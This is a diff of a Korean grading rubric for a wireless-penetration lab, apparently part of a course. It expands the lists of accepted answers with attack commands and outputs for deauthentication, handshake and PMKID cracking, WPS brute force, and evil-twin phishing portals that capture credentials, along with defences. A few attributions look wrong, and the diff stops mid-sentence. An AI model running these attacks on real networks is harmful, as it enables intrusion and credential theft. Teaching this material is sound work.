@@ -35,13 +35,43 @@ steps:
       - '--- 구분자'
       - 무선 인터페이스 부재 처리
       acceptable_methods:
-      - ip link + iwconfig
-      - iw dev list
-      - ls /sys/class/net/*/wireless
+      - "ip link show + iwconfig 병행 (수기 baseline). 명령: ip link show 2>&1; echo
+        '---'; iwconfig 2>&1 || echo 'No wireless interfaces'. 출력: 1: lo / 2: ens33
+        / --- / lo no wireless extensions / ens33 no wireless extensions. 해석: ip
+        link 는 모든 NIC, iwconfig 는 wireless extension 만. lab VM 은 wireless 카드
+        없으므로 'no wireless extensions' 정상."
+      - "iw dev (modern wireless tool) — sudo iw dev list 2>&1 || iw dev. 출력: phy#0
+        Interface wlan0 ifindex 3 type managed. 해석: iw 가 iwconfig 대체 (mac80211
+        지원). lab 환경 = 출력 없음 (VM). 실전 wlan0 monitor mode 전환의 사전 점검."
+      - "/sys/class/net 직접 — ls -la /sys/class/net/ + for i in /sys/class/net/*/wireless;
+        do echo $i; done. 출력: ls: 'wireless' directory 부재. 해석: /sys 는 kernel 직접
+        view. wireless 서브디렉토리 존재 = 무선 카드 존재. 가장 신뢰성 높은 검사."
+      - "lspci/lsusb 하드웨어 — sudo lspci -nn | grep -iE 'wireless|wifi|802.11';
+        sudo lsusb | grep -iE 'wireless|wifi'. 출력: (없음, VMware vNIC 만). 해석:
+        물리 wireless adapter 식별. VMware/KVM VM 에는 PCI passthrough 안 하면 wireless
+        없음. USB wireless dongle 도 lsusb 로 식별."
+      - "airmon-ng (aircrack-ng suite 의 monitor mode 전환 도구) — sudo airmon-ng. 출력:
+        PHY Interface Driver Chipset / (lab 출력 없음). 해석: airmon-ng = wlan 인터페이스
+        나열 + monitor mode 전환 동시 수행. wireless 카드 있으면 airmon-ng start wlan0
+        → wlan0mon 생성."
+      - "rfkill 라디오 상태 — sudo rfkill list. 출력: (lab 없음 — radio 없음 / 실전: 0:
+        phy0: Wireless LAN: Soft blocked: no Hard blocked: no). 해석: 무선 카드의
+        soft/hard kill switch 상태. 노트북 wireless 켜져있는지 확인. blocked = 모니터
+        모드 전환 불가."
+      - "dmesg wireless 드라이버 검색 — sudo dmesg | grep -iE 'iwl|ath|rtl|brcm|wireless|wlan'
+        | head -10. 출력: (lab 없음 / 실전: iwlwifi 0000:00:14.3: Detected Intel(R) Wi-Fi
+        6 AX200). 해석: kernel 부팅 시 wireless 드라이버 로드 메시지. driver 식별 →
+        호환되는 monitor mode 사용 가능 여부 판단."
+      - "nmcli (NetworkManager) wireless 상태 — nmcli device status; nmcli radio.
+        출력: DEVICE TYPE STATE / lo loopback unmanaged / ens33 ethernet connected.
+        해석: NetworkManager 가 wireless adapter 관리. nmcli wifi list 로 주변 SSID
+        스캔 가능 (실전). lab 은 ethernet 만."
       negative_signs:
-      - wireless 검사 없음
-      - 단일 명령만
-      - VM 부재 처리 없음
+      - wireless 검사 없음 (ip link show 만)
+      - 단일 명령만 (3+ 도구 비교 없음)
+      - VM 부재 처리 없음 ("실전이라면..." 맥락 X)
+      - lspci/dmesg 하드웨어 검사 누락
+      - rfkill 라디오 상태 무시 (실전에서 흔한 함정)
   target_vm: attacker
 - order: 2
   instruction: Wi-Fi 보안 프로토콜의 발전 과정을 정리하라. WEP, WPA, WPA2, WPA3 각각의 암호화 방식과 취약점을 비교하라.
@@ -73,13 +103,39 @@ steps:
       - WEP/WPA/WPA2/WPA3 4프로토콜 비교
       - 암호화 알고리즘 + 취약점 명시
       acceptable_methods:
-      - 프로토콜 비교 표
-      - NIST SP 800-153 무선 보안
-      - Wi-Fi Alliance 표준 문서
+      - "프로토콜 비교 표 작성 (수기 baseline) — echo -e '| Protocol | Year | Encryption
+        | Key Mgmt | Vulnerability |\\n| WEP | 1997 | RC4 (40/104-bit) | Static |
+        IV collision/FMS |\\n| WPA | 2003 | TKIP (RC4) | PSK/EAP | TKIP weak |\\n|
+        WPA2 | 2004 | AES-CCMP | PSK/EAP | KRACK/dict |\\n| WPA3 | 2018 | AES-GCMP
+        | SAE | Dragonblood (patched) |'. 해석: 4 프로토콜 × 5 컬럼 매트릭스. 연도/암호화/키
+        관리/취약점."
+      - "NIST SP 800-153 (Wireless LAN Security 가이드) 참조 — 'WPA2-Enterprise
+        with EAP-TLS' 권고. 출력: 표 + NIST 권고. 해석: 표준 framework 인용 = 보고서
+        설득력. NIST.gov 에서 무료 PDF. SP 800-97 (RSN), SP 800-119 (IPv6) 도 보강."
+      - "IEEE 802.11i (WPA2 RSN) 사양 분석 — 4-Way Handshake / Group Key Handshake
+        / GTK / PMK / PTK 키 계층. 해석: 802.11i = WPA2 의 IEEE 표준. PMK (사전 공유) →
+        PTK (페어 임시 키) → 데이터 암호화. 핵심 보안 mechanism."
+      - "Wi-Fi Alliance 인증 — wifi.org 의 'Wi-Fi CERTIFIED WPA3' 페이지. 출력: WPA3-Personal
+        SAE / WPA3-Enterprise 192-bit / Wi-Fi Easy Connect (DPP). 해석: WPA3 vendor
+        인증 라벨 식별. 제품 구매 시 WPA3 logo 확인 필수."
+      - "Dragonblood paper (CVE-2019-9494, Vanhoef + Ronen 2019) 분석. 출력: WPA3-SAE
+        side-channel + downgrade 공격. 해석: WPA3 출시 직후 발견된 취약점. 패치됐지만
+        구현체별 차이. AP firmware 업데이트 필수."
+      - "KRACK paper (CVE-2017-13077, Vanhoef 2017) 분석. 출력: WPA2 4-way handshake
+        의 message 3 재전송 → key reinstall → IV 0 재사용 → traffic 복호화. 해석:
+        WPA2 구현 결함. 모든 OS 패치됨 (2017-2018). 미패치 IoT/router 여전히 취약."
+      - "Defensive — 802.1X/EAP-TLS Enterprise 모드. 출력: PSK 대신 RADIUS + 인증서.
+        해석: PSK 의 사전 공격 위험 회피. 회사/대학 환경 표준. EAP-TLS = 상호 인증서,
+        EAP-PEAP = MS-CHAPv2 (취약, 회피)."
+      - "역사적 사건 — 2003 Wardriving / 2004 WPA TKIP 공격 / 2008 Beck-Tews 부분 공격
+        / 2017 KRACK / 2019 Dragonblood. 해석: 무선 보안 공격사 5 사건. 각 사건 → 표준
+        업데이트. 학습자가 시간순 인지 = 새 취약점 등장 시 빠른 대응."
       negative_signs:
-      - 프로토콜 2개 이하
-      - 취약점 누락
-      - WPA3 누락
+      - 프로토콜 2개 이하 (WEP/WPA2 만 비교)
+      - 취약점 누락 (각 프로토콜의 attack 명시 X)
+      - WPA3 누락 (현재 표준 인식 부족)
+      - 암호화 알고리즘 (RC4/AES) 명시 없음
+      - 표준 framework (NIST/IEEE) 참조 없음
   target_vm: attacker
 - order: 3
   instruction: aircrack-ng 도구 스위트의 구성 요소와 각 도구의 역할을 정리하라.
@@ -107,13 +163,40 @@ steps:
       - 5개 도구 (airmon/airodump/aireplay/aircrack/airbase)
       - 각 도구 사용법 예시
       acceptable_methods:
-      - aircrack-ng 5종 설명
-      - wifite (래퍼)
-      - Bettercap wifi 모듈
+      - "aircrack-ng 5 도구 설명 (수기 baseline) — 1) airmon-ng start wlan0: Monitor 모드
+        전환. 2) airodump-ng wlan0mon: 주변 SSID 스캔. 3) airodump-ng -c 6 --bssid AABB:CC:DD:EE
+        -w cap wlan0mon: 특정 AP 캡처. 4) aireplay-ng -0 5 -a AP_MAC -c CLIENT wlan0mon:
+        Deauth. 5) aircrack-ng -w wordlist cap.cap: 핸드셰이크 크래킹. 해석: airmon→airodump
+        →aireplay→aircrack 표준 워크플로."
+      - "wifite (자동화 래퍼) — sudo wifite --kill --wpa --crack -wp wordlist.txt.
+        출력: [+] Scanning ... [+] Captured handshake AP_MAC. 해석: aircrack-ng 의 4-5
+        도구를 한 명령으로 자동화. monitor mode 자동 전환 + 자동 deauth + 자동 capture +
+        자동 hashcat. 초보자 친화."
+      - "Bettercap (modern Go 기반) — sudo bettercap -iface wlan0 -caplet wifi-recon.cap.
+        출력: wifi.show ... wifi.handshake AP_MAC. 해석: aircrack-ng 의 modern 대안.
+        web UI + REST API + caplet (자동화 스크립트). MitM/ARP spoof 통합."
+      - "hcxdumptool (PMKID 공격) — sudo hcxdumptool -i wlan0 -o capture.pcapng --enable_status=1.
+        출력: 22000 형식 hash 추출. 해석: PMKID = WPA2 의 첫 message 만으로 크래킹 가능
+        (client 없어도 OK). 2018 atom 발표. KRACK 보다 효율."
+      - "Kismet (passive scanner) — sudo kismet -c wlan0. 출력: web UI :2501 + 모든 AP/
+        client 실시간 표시. 해석: aircrack-ng 의 airodump 보다 풍부한 GUI. SSID/BSSID/Channel/
+        Encryption + Bluetooth/Zigbee/SDR 까지."
+      - "airbase-ng (Fake AP / Evil Twin) — sudo airbase-ng -e 'Free WiFi' -c 6 -P
+        wlan0mon. 출력: Created tap interface at0 / SSID 'Free WiFi' broadcasting.
+        해석: aircrack-ng suite 의 마지막 도구. Open AP + captive portal 결합 → credential
+        harvest. Evil Twin 기본 빌딩 블록."
+      - "Reaver (WPS PIN brute) — sudo reaver -i wlan0mon -b AP_MAC -vv. 출력: Pixie-Dust
+        attack ... PIN: 12345670 PSK: password123. 해석: WPS PIN 8자리 = 11000 조합.
+        Pixie-Dust (RTL/Realtek 칩) = 1초 내 PIN 추출. 노후 router 표적."
+      - "Bastion AI orchestrator (manual track 차이) — Non-AI 학생은 위 도구 직접 실행 +
+        결과 해석. AI 학생은 Bastion 이 'wireless audit' workflow 자동. Non-AI 가 도구 의미
+        깊게 이해 → AI 가 발견 못 한 케이스 catch."
       negative_signs:
-      - 도구 3개 이하
-      - 사용 예시 없음
-      - 워크플로 맥락 없음
+      - 도구 3개 이하 (aircrack-ng suite 만 나열)
+      - 사용 예시 없음 (airmon/airodump 명령 인자 X)
+      - 워크플로 맥락 없음 (도구 간 순서 / 산출물 흐름 X)
+      - modern 대안 (Bettercap/wifite/Kismet) 누락
+      - PMKID/WPS 같은 다른 공격 벡터 미언급
   target_vm: attacker
 - order: 4
   instruction: WPA2-PSK 4-Way Handshake의 원리를 설명하고, 각 단계에서 교환되는 메시지를 정리하라.
@@ -143,13 +226,38 @@ steps:
       - ANonce/SNonce/MIC/PMK/PTK 용어
       - Message 1-4 단계 + 공격 벡터
       acceptable_methods:
-      - 802.11i 핸드셰이크 도식
-      - hcxdumptool + hashcat 변환
-      - PMK = PBKDF2 수식
+      - "4-Way Handshake 4 단계 도식 (수기 baseline) — Message 1: AP→Client (ANonce).
+        Message 2: Client→AP (SNonce + MIC). Message 3: AP→Client (GTK + MIC). Message
+        4: Client→AP (ACK + MIC). 해석: 두 nonce 교환 → PTK 도출. PMK = PBKDF2(PSK,
+        SSID, 4096, 256). PTK = PRF(PMK, ANonce, SNonce, AP_MAC, Client_MAC)."
+      - "PMK = PBKDF2 수식 — PMK = PBKDF2-HMAC-SHA1(PSK, SSID, 4096 iter, 256 bit).
+        해석: PSK = 사용자 비밀번호. SSID = salt 역할. 4096 회 iteration = brute force
+        지연. 동일 SSID 면 rainbow table 가능."
+      - "hcxdumptool + hashcat 22000 변환 — hcxpcapngtool -o hash.22000 capture.pcapng.
+        출력: 22000 hash 형식 (PMKID 또는 EAPOL-MIC). 해석: aircrack-ng 의 cap 파일 → hashcat
+        의 22000 hash 변환. GPU 크래킹 입력 형식."
+      - "Wireshark 핸드셰이크 분석 — wireshark capture.cap → filter eapol. 출력: 4 패킷
+        (Message 1-4) 각각 별도 row. 해석: 시각적 검증. ANonce/SNonce/MIC 필드 확인.
+        교육용 + 트러블슈팅."
+      - "scapy 스크립트로 시뮬레이션 — python3 -c 'from scapy.all import *; ... EAPOL'.
+        출력: 4 EAPOL 프레임. 해석: 핸드셰이크 직접 코딩 → 각 필드의 의미 / wire 형식
+        / MIC 검증 알고리즘 깊은 이해. 학생 자료."
+      - "MIC (Message Integrity Code) 검증 — MIC = HMAC-MD5(KCK, frame). KCK = PTK
+        의 처음 16 byte. 해석: MIC 가 위변조 방지. PSK 후보 → PMK → PTK → KCK → MIC 계산
+        → 캡처된 MIC 와 비교 = aircrack 의 핵심 알고리즘."
+      - "공격 벡터 — 1) Offline dictionary on PSK (가장 흔함). 2) KRACK (key reinstall).
+        3) PMKID (1 message 만으로 hash 추출, hcxdumptool). 4) Evil Twin (PSK 무관,
+        captive portal). 5) WPS PIN brute (Reaver). 해석: 5 벡터 = 무선 침투 테스트의
+        주요 attack tree."
+      - "Defensive — 802.11w (PMF, Protected Management Frames) 활성화 + WPA3-SAE.
+        해석: 802.11w = deauth/disassoc 프레임 보호 → KRACK 일부 차단. WPA3 SAE = 오프라인
+        PSK 사전 공격 원천 차단. 둘 다 IEEE 표준."
       negative_signs:
-      - 핸드셰이크 단계 없음
+      - 핸드셰이크 단계 없음 (Message 1-4 명시 X)
       - PMK/PTK 용어 없음
-      - 공격 벡터 누락
+      - 공격 벡터 누락 (offline dict / KRACK / PMKID / Evil Twin)
+      - PBKDF2 수식 / iteration 인식 X
+      - MIC 검증 메커니즘 무시
   target_vm: attacker
 - order: 5
   instruction: aircrack-ng를 사용하여 사전에 준비된 WPA2 핸드셰이크 캡처 파일을 크래킹하라(시뮬레이션).
@@ -179,13 +287,38 @@ steps:
       - 4단계 워크플로 (Monitor→Capture→Deauth→Crack)
       - GPU vs CPU 속도 비교
       acceptable_methods:
-      - aircrack-ng + rockyou
-      - hashcat -m 22000
-      - wifite 자동화
+      - "aircrack-ng + rockyou (수기 baseline) — sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt
+        capture-01.cap. 출력: KEY FOUND! [ password123 ] / Master Key + Transient
+        Key 표시. 해석: rockyou.txt = 14M passwords. CPU 약 2K key/sec. 4시간/1M 단어.
+        PMK 계산 (PBKDF2 4096) 가 병목."
+      - "hashcat -m 22000 GPU — hashcat -m 22000 -a 0 hash.22000 rockyou.txt --status.
+        출력: Speed.#1: 50000 H/s (GPU RTX 3060). 해석: GPU 약 50K H/s = aircrack 의
+        25 배. 1M 단어 7분. PBKDF2 4096 iteration 도 GPU 병렬화 효과."
+      - "hcxdumptool PMKID 추출 — sudo hcxdumptool -i wlan0 --enable_status=1 -o cap.pcapng;
+        hcxpcapngtool -o hash.22000 cap.pcapng. 출력: 1 hash extracted (PMKID 형식).
+        해석: 핸드셰이크 4 패킷 캡처 불필요. 첫 association 의 PMKID 만으로 추출. client
+        없는 AP 도 공격 가능."
+      - "wordlist 생성 — crunch 8 8 0123456789 -o numeric.txt (8자리 숫자). 출력: 1억
+        조합. 해석: target 이 8자리 숫자 비번 (010-XXXX-YYYY 식) 추정 시 정확 wordlist.
+        1M wordlist 보다 hit rate 우수."
+      - "rule-based attack — hashcat -m 22000 hash rockyou -r /usr/share/hashcat/rules/best64.rule.
+        출력: 64 변형 rule 적용 (대문자/특문 추가). 해석: 단일 단어 → 64 변형 (Password,
+        password, P@ssw0rd ...). 사전 공격의 keyspace 64 배 확장."
+      - "mask attack — hashcat -m 22000 hash -a 3 ?u?l?l?l?l?l?d?d. 출력: 8자리 mask
+        (Upper+Lower×5+Digit×2). 해석: 정확한 password 패턴 알 때 효율. 8자리 = 26^6 ×
+        10^2 = ~30B 조합. RTX 3060 30 분 완주."
+      - "공격 시간 매트릭스 — 6자리 숫자 (1M, 20s) / 8자리 영숫자 (218B, 12일) / 12자리
+        영숫자 (3.2 quintillion, 200만년). 해석: 비번 길이 + 종류 = 보안 핵심.
+        12자리 이상 권고. 사용자 교육 자료."
+      - "방어 — 1) WPA3-SAE 사용 (offline dict 차단). 2) WPA2 PSK 16 자리 이상 + 특문.
+        3) WPA2-Enterprise (RADIUS). 4) Captive portal (PSK 무관). 해석: PSK 자체가
+        취약점. enterprise 모드가 가장 안전."
       negative_signs:
-      - 워크플로 단계 부족
-      - wordlist 없음
-      - 속도 비교 없음
+      - 워크플로 단계 부족 (Monitor/Capture/Deauth/Crack 4 단계 누락)
+      - wordlist 없음 (rockyou/crunch/mask 인식 X)
+      - 속도 비교 없음 (CPU vs GPU)
+      - 4096 iteration / PBKDF2 깊이 없음
+      - 방어 권고 없음 (WPA3 / Enterprise 인식 X)
   target_vm: attacker
 - order: 6
   instruction: Evil Twin 공격의 원리를 설명하고 구성 요소를 정리하라.
@@ -217,13 +350,40 @@ steps:
       - 5개 구성요소 (AP/DHCP/NAT/Portal/SSL)
       - 공격 흐름 + 탐지 방법
       acceptable_methods:
-      - airbase-ng + dnsmasq + nginx
-      - wifiphisher 자동화
-      - Bettercap evil twin
+      - "5 구성요소 stack (수기 baseline) — 1) Fake AP: airbase-ng -e 'TargetSSID' -c 6
+        wlan0mon. 2) DHCP: dnsmasq -C dnsmasq.conf (at0 인터페이스). 3) NAT: iptables
+        -t nat -A POSTROUTING -o eth0 -j MASQUERADE. 4) Captive portal: nginx + login
+        page. 5) SSL strip: sslstrip -l 8080. 해석: 5 layer = client 의 정상 네트워크처럼
+        보임."
+      - "wifiphisher 자동화 — sudo wifiphisher -aI wlan0mon -jI wlan1mon -p firmware-upgrade.
+        출력: Target SSID: ... → Phishing template loaded → captured: pass=password123.
+        해석: 자동화 도구. firmware update / OAuth / captive portal 5+ phishing 템플릿
+        내장. 학생 친화."
+      - "Bettercap evil twin caplet — sudo bettercap -caplet hstshijack/hstshijack.
+        출력: HSTS strip + DNS spoof 자동. 해석: modern 도구. wifi.recon / wifi.assoc /
+        wifi.deauth + http.proxy 통합. caplet 으로 1줄 실행."
+      - "Mana Toolkit — sudo mana-toolkit start (Sergey Bratus 발표). 출력: KARMA
+        attack — client 의 'preferred SSID' probe 응답. 해석: Open AP probe 자동 응답
+        → client 가 자동 연결 (저장된 open SSID). 사용자 알아챔 확률 낮음."
+      - "WPA Enterprise Evil Twin (eaphammer) — sudo eaphammer -i wlan0mon --essid
+        TargetCorp --auth wpa-eap. 출력: Captured EAP credentials. 해석: corporate
+        WPA-Enterprise 위장. RADIUS 가짜 → MS-CHAPv2 hash 캡처. asleap 으로 크래킹."
+      - "Captive portal HTML 작성 — cat > /var/www/html/index.html << EOF\\n<form action='/login'\\nUsername:
+        ... Password: ... </form>\\nEOF. 해석: phishing 페이지 직접 작성. target 회사 logo
+        + 정상 로그인 form 흉내. credential POST 캡처."
+      - "탐지 — Kismet + bssid_sniffer (Rogue AP 식별). 출력: 동일 SSID 다른 BSSID 경고.
+        해석: 정상 AP 의 BSSID 화이트리스트. 새 BSSID + 동일 SSID = Evil Twin 의심. 802.11k
+        BSSID Transition 확인."
+      - "방어 — 1) WPA3 + PMF (deauth 차단 → Evil Twin 의 reconnect 강제 어려움). 2) 802.1X
+        EAP-TLS 인증서 검증 (RADIUS 위조 어려움). 3) 회사 wireless 만 프로필 저장 (auto-connect
+        제한). 4) WIDS (Aruba ClearPass / Cisco WIPS). 5) 학생 교육 (HTTPS warning ignore
+        금지)."
       negative_signs:
-      - 구성요소 3개 이하
-      - 공격 흐름 없음
-      - 탐지 누락
+      - 구성요소 3개 이하 (Fake AP/DHCP/NAT/Portal/SSL 중 부족)
+      - 공격 흐름 없음 (왜 client 가 연결되는지 설명 X)
+      - 탐지 누락 (Kismet/WIDS 무시)
+      - 방어 권고 없음 (PMF/EAP-TLS 인식 X)
+      - 자동화 도구 (wifiphisher/Bettercap) 누락
   target_vm: attacker
 - order: 7
   instruction: Deauthentication 공격의 원리를 설명하라. 802.11 관리 프레임의 취약점이 어떻게 악용되는지 분석하라.
@@ -252,13 +412,37 @@ steps:
       - aireplay-ng -0 명령
       - 802.11w PMF 방어 언급
       acceptable_methods:
-      - aireplay-ng -0
-      - mdk3 deauth flood
-      - scapy Dot11Deauth()
+      - "aireplay-ng -0 (수기 baseline) — sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF
+        -c 11:22:33:44:55:66 wlan0mon. 출력: Sending 64 directed DeAuth (code 7). STMAC:
+        ... [ 0|62 ACKs]. 해석: -0 5 = 5 회 deauth (0=continuous). -a AP, -c client.
+        deauth 후 client 재인증 → handshake 캡처 강제."
+      - "mdk3 deauth flood — sudo mdk3 wlan0mon d -b blacklist.txt -c 6. 출력: AP DEAUTH
+        flood ongoing. 해석: 1초당 수백 deauth. WIDS 탐지 가능. 무차별 vs aireplay-ng 의
+        타겟. mdk4 가 successor."
+      - "scapy 직접 — python3 -c 'from scapy.all import *; pkt = RadioTap()/Dot11(addr1=client,addr2=ap,addr3=ap)/Dot11Deauth(reason=7);
+        sendp(pkt, iface=\"wlan0mon\", count=10)'. 해석: scapy 로 deauth frame 직접 작성.
+        reason code 변경 (7 = Class 3 frame, 1 = unspecified) → IDS 시그니처 회피."
+      - "원리 — 802.11 management frame (deauth/disassoc/auth) 가 암호화/MIC 없음 (pre-PMF).
+        해석: 누구나 위조 가능. spoofed source MAC = AP 의 BSSID. client 는 정상 deauth 으로
+        받아들임 → 즉시 disconnect."
+      - "용도 4가지 — 1) WPA handshake 강제 캡처 (재연결 시 4-Way 캡처). 2) DoS (지속
+        deauth → 통신 불가). 3) Evil Twin 강제 (deauth → client 가 신호 강한 가짜 AP 로). 4)
+        Captive portal 우회 (client 통신 강제 끊고 attacker MitM)."
+      - "탐지 — WIDS / Kismet 의 deauth flood alert. 출력: ALERT: Deauth flood from
+        AA:BB:CC ... 64 frames in 5s. 해석: 단위 시간 deauth 임계치. Aruba/Cisco WIPS 표준
+        탐지. 무선 보안 모니터링 핵심."
+      - "방어 — 802.11w PMF (Protected Management Frames). 해석: deauth/disassoc 에 MIC
+        추가. AP+Client 양측 802.11w 지원 시 위조 deauth 거부. WPA3 = mandatory, WPA2 =
+        optional."
+      - "Defensive — 1) PMF 활성화 (router 설정). 2) WPA3 사용 (PMF 의무). 3) WIDS 배포
+        (deauth flood alert). 4) static MAC ACL (BSSID + ESSID 검증). 해석: 4중 방어. PMF
+        가 가장 효과. WIDS 가 사후 탐지."
       negative_signs:
-      - aireplay 없음
-      - PMF 방어 없음
-      - 관리 프레임 맥락 없음
+      - aireplay 없음 (deauth 명령 부재)
+      - PMF 방어 없음 (802.11w 인식 X)
+      - 관리 프레임 맥락 없음 (왜 위조 가능한지 설명 X)
+      - 용도 1-2개 만 (WPA capture / DoS / Evil Twin / portal 4 vector)
+      - WIDS 탐지 무시
   target_vm: attacker
 - order: 8
   instruction: WEP 크래킹의 원리를 설명하라. IV(Initialization Vector) 충돌 취약점이 어떻게 악용되는지 분석하라.
@@ -288,13 +472,35 @@ steps:
       - FMS 또는 PTW 공격 명시
       - 24-bit IV 한계 + 명령 흐름
       acceptable_methods:
-      - FMS/PTW + aireplay-ng -3
-      - aircrack-ng + ARP replay
-      - WEPCrack/dwepcrack
+      - "WEP 약점 — RC4 + 24-bit IV (수기 baseline). 출력: 16,777,216 IV 공간 / 5K 패킷 후
+        재사용 시작. 해석: IV 가 평문으로 전송 + key 와 결합해 keystream. IV 충돌 → 동일 keystream
+        2회 → XOR 로 평문 추출 (Vernam 위반)."
+      - "FMS 공격 (Fluhrer-Mantin-Shamir 2001) — 약한 IV (B+3, FF, X) 패턴 통계 분석. 출력:
+        4만~8.5만 IV 수집 → key 복원. 해석: 1990s 무선 보안의 종말. RC4 자체의 statistical bias
+        악용. 학술 논문 + 도구 동시 등장."
+      - "PTW 공격 (Pychkine-Tews-Weinmann 2007) — 2만 IV 만 필요. 해석: FMS 의 4배 효율. ARP
+        request 의 짧은 길이 (28 byte 평문 알 수 있음) 악용. aircrack-ng 의 default 알고리즘."
+      - "aircrack-ng 4 step — sudo airmon-ng start wlan0; sudo airodump-ng -c 6 --bssid
+        AP -w cap wlan0mon; sudo aireplay-ng -3 -b AP wlan0mon (ARP replay 으로 IV 폭증);
+        sudo aircrack-ng cap-01.cap. 해석: 표준 워크플로. PTW 가 default. -K 로 FMS legacy."
+      - "ChopChop 공격 (KoreK 2004) — aireplay-ng -4 -h CLIENT -b AP wlan0mon. 해석: 한
+        WEP 패킷 1 byte 씩 복호화 (no key needed). 결과: 평문 packet → injection 가능 → ARP
+        replay 트리거 → IV 폭증 → key 복원."
+      - "Fragmentation 공격 (Bittau 2005) — aireplay-ng -5. 해석: ChopChop 의 변형. 8 byte
+        keystream 만 알면 임의 평문 암호화 패킷 송신 가능. ChopChop 보다 빠름. AP 가 fragmentation
+        지원 시."
+      - "besside-ng (자동화) — sudo besside-ng wlan0mon. 출력: 모든 WEP/WPA AP 자동 공격.
+        해석: aircrack-ng suite 의 fully-automated 모드. 하나씩 명령 칠 필요 없음. 학생
+        시연용."
+      - "WEP BROKEN 결론 — 1) 5분 내 어떤 WEP 도 깨짐. 2) Wi-Fi Alliance 가 2003 부터 WPA
+        권고. 3) 모든 router 가 WPA2 이상 지원. 4) WEP 사용 = 무방비. 해석: 무선 보안 교육의
+        '왜 새 표준이 필요했는지' 역사적 사례. 실 환경 절대 사용 금지."
       negative_signs:
-      - IV 24-bit 맥락 없음
-      - FMS/PTW 누락
-      - WEP BROKEN 인식 없음
+      - IV 24-bit 맥락 없음 (왜 5K 패킷 후 깨지는지)
+      - FMS/PTW 누락 (학술적 공격사 무시)
+      - WEP BROKEN 인식 없음 (실 사용 가능한 것처럼 설명)
+      - aireplay-ng -3 (ARP replay) 단계 누락
+      - 1997 → 2003 WPA 전환 역사 무지
   target_vm: attacker
 - order: 9
   instruction: KRACK(Key Reinstallation Attack) 취약점의 원리를 설명하라.
@@ -327,13 +533,36 @@ steps:
       - Message 3 재전송 + nonce 리셋
       - CVE-2017-13077 또는 Vanhoef 언급
       acceptable_methods:
-      - KRACK 원리 설명
-      - krackattacks-scripts (Vanhoef PoC)
-      - CVE 매핑
+      - "KRACK 원리 (수기 baseline) — 4-Way Handshake 의 Message 3 (GTK + MIC) 가 client
+        에 도달 안 하면 AP 가 재전송. client 가 동일 PTK 재설치 + nonce counter 0 으로 리셋.
+        해석: AES-CCMP nonce 재사용 → 동일 keystream 2회 → XOR 으로 평문 추출."
+      - "krackattacks-scripts (Mathy Vanhoef 공식 PoC, github.com/vanhoef/krackattacks-scripts)
+        — python3 krack-test-client.py wlan0mon. 출력: client 의 KRACK 취약 여부 진단.
+        해석: 학술 PoC. 학생 환경 검증 가능."
+      - "CVE 매핑 — CVE-2017-13077 (key reinstall in 4-way), CVE-2017-13078 (Group
+        Key reinstall), CVE-2017-13079 (Group Key in Fast Roaming), CVE-2017-13080
+        (Group Key in WNM-Sleep), CVE-2017-13084-13088. 해석: 10 CVE 한 패키지. KRACK
+        = umbrella term."
+      - "공격 영향 매트릭스 — Linux/Android (wpa_supplicant 2.4-2.6) = traffic decrypt +
+        TCP hijack. macOS/Windows = 부분 영향 (덜 심각). iOS = 일부 영향. 해석: OS 별 패치
+        2017 말~2018 초. wpa_supplicant 가 가장 위험."
+      - "MitM 필요 — KRACK 은 attacker 가 AP-Client 사이 MitM 위치 필요. 해석: 단순
+        promiscuous monitor 로 안 됨. fake AP (다른 channel) 로 client 끌어들이고 forward.
+        실전 attacker 위치 확보가 어려움 = 공격 진입 장벽."
+      - "방어 — 1) 패치된 OS/firmware 사용 (Linux 4.13+, iOS 11.1+, Win 1709+). 2) 802.11w
+        PMF (M3 재전송 무결성 검증). 3) WPA3 (4-way handshake 자체 변경, KRACK 영향
+        없음). 해석: 3중 방어. PMF 가 즉시 적용. WPA3 가 장기 해결."
+      - "패치 history — 2017-10-16 Vanhoef 공개. 2017-10-30 Microsoft 패치. 2017-11-10
+        Apple 패치. 2018-Q1 IoT/router 점진 패치. 해석: 신속한 OS 패치, 느린 IoT/router
+        패치. 미패치 IoT 가 잔존 위험."
+      - "탐지 — Wireshark 의 'wlan.fc.retry == 1 + EAPOL Message 3' 필터. 해석: AP 가
+        M3 재전송 = retry flag. 정상은 0~1 회. 다수 retry = KRACK 의심. WIDS 룰 추가 가능."
       negative_signs:
-      - M3 재전송 맥락 없음
-      - nonce 재사용 누락
+      - M3 재전송 맥락 없음 (왜 재설치 발생하는지)
+      - nonce 재사용 누락 (CCMP 의 핵심 보안 가정 위반 인식 X)
       - CVE/패치 정보 없음
+      - 영향 OS 매트릭스 없음 (wpa_supplicant 가 가장 위험인지 모름)
+      - WPA3/PMF 방어 인식 X
   target_vm: attacker
 - order: 10
   instruction: WPA3-SAE(Simultaneous Authentication of Equals)의 작동 원리를 설명하고 WPA2-PSK와
@@ -365,13 +594,36 @@ steps:
       - Dragonfly + Forward Secrecy 언급
       - 오프라인 vs 온라인 공격 비교
       acceptable_methods:
-      - SAE Dragonfly 핸드셰이크
-      - Wi-Fi Alliance WPA3 사양
-      - RFC 7664
+      - "SAE Dragonfly 핸드셰이크 (수기 baseline) — 비밀번호 → password element (PE, ECC point).
+        AP+Client 양쪽 random scalar 생성. commit/confirm 2 단계 ECC DH. 결과 PMK = ephemeral.
+        해석: PSK 직접 노출 X. handshake 캡처 ≠ offline crack. 매 session 다른 PMK = forward
+        secrecy."
+      - "Wi-Fi Alliance WPA3 사양 (2018-06) — wifi.org/discover-wi-fi/security. 출력:
+        WPA3-Personal SAE / WPA3-Enterprise 192-bit + EAP-TLS / Wi-Fi Easy Connect (DPP).
+        해석: 3 모드. Personal (집/소형). Enterprise (회사). DPP (QR 코드 onboarding)."
+      - "RFC 7664 SAE (2015 IETF) — Dragonfly 정식 표준화. 해석: WPA3 채택 전부터 IETF 표준.
+        802.11s mesh 에 먼저 적용. crypto primitive 안전성 학술 검증."
+      - "Forward Secrecy 시나리오 — attacker 가 1년치 traffic 캡처 + 1년 후 비밀번호 탈취.
+        WPA2 = 1년치 모두 복호화. WPA3 = 0 byte 복호화 (각 session ephemeral PMK). 해석:
+        장기 보호. PSK 변경 안 했어도 과거 traffic 안전."
+      - "공격 매트릭스 비교 — WPA2: 핸드셰이크 캡처 → rockyou 4시간 → PSK 추출 / WPA3: 매
+        guess 마다 AP 와 새 SAE handshake → online rate-limit (10/sec). 해석: WPA2 = offline
+        무한 시도. WPA3 = online 10/sec 의 throttling = 천만 password 12일."
+      - "Dragonblood 취약점 (CVE-2019-9494, Vanhoef+Ronen 2019) — SAE 의 password element
